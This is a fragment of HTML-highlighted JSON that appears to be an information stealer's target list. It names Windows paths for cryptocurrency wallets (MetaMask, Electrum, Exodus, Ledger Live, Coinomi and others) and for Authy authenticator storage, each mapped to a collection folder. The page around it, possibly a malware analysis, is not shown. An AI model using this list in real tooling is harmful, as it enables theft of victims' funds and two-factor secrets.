class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*trezor*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*metamask*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*crypto*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Binance&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;app-store.json&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Binance&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Binance&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;.finger-print.fp&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Binance&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Binance&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;simple-storage.json&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Binance&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Electrum\\wallets&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Electrum&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Ethereum&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;keystore&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Ethereum&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Exodus\\exodus.wallet&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Exodus&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Ledger Live&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Ledger Live&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\atomic\\Local Storage\\leveldb&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Atomic&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\Coinomi\\Coinomi\\wallets&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Coinomi&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Authy Desktop\\Local Storage\\leveldb&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Authy Desktop&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span 